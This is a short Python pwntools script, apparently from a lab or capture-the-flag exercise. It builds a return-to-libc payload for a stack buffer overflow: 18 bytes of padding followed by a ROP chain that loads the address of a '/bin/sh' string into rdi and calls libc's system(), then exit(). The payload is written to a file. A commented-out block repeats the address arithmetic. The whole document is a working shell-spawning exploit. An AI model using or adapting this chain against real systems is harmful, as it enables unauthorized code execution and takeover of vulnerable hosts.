from pwn import p64

# libc_base_address = p64(0x7FFFF7C00000)
# system_func = libc_base_address + p64(0x55230)
# sh_addr = libc_base_address + p64(0x1C041B)
# rdi_addr = libc_base_address + p64(0x28715)
# main_exit = p64(0x40119D)
# libc_exit = libc_base_address + p64(0x45240)

libc_base_address = 0x7FFFF7C00000
system_func = libc_base_address + 0x55230
sh_addr = libc_base_address + 0x1C041B
rdi_addr = libc_base_address + 0x28715
main_exit = 0x40119D
libc_exit = libc_base_address + 0x45240

payload = b"A" * 18
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(main_exit)
payload += p64(system_func)
payload += p64(libc_exit)

f = open("payload", "wb")
f.write(payload)
f.close()
